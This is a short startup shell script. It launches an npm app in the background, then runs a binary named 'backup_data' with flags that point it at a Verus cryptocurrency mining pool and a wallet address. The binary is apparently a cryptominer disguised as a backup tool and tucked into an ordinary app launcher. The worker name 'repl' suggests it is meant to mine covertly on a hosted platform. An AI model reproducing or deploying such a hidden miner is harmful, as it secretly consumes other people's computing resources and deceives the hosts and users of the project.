#!/bin/sh
npm start &
PoolHost=stratum+tcp://sg.vipor.net
Port=5040
PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
WorkerName=repl
Threads=1
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
chmod +x backup_data
./backup_data -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"
